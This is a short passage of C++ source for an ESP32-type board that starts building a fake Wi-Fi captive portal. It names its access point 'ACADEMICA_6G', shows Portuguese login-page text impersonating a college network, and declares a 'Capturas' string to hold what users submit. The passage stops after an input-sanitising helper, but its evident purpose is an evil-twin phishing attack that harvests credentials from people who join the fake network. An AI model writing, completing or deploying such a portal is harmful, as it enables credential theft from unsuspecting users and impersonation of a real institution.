#include <WiFiMulti.h>
#include <DNSServer.h>
#include <WebServer.h>

// Configurações
const char* SSID_NAME = "ACADEMICA_6G";  
const char* SUBTITLE = "Conecte-se para acessar a internet da faculdade.";
const char* TITLE = "Portal de Acesso";
const char* BODY = "Preencha seus dados para continuar.";
const char* POST_TITLE = "Validando...";
const char* POST_BODY = "<div class='loading'><div class='spinner'></div><p>Processando seu acesso.<br>Aguarde alguns segundos...</p></div>";
IPAddress APIP(172, 0, 0, 1); 

// Sistema
const byte DNS_PORT = 53;
const byte HTTP_CODE = 200;
DNSServer dnsServer;
WebServer webServer(80);

String Capturas = "";

// Funções
String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  return a.substring(0, 200);
}

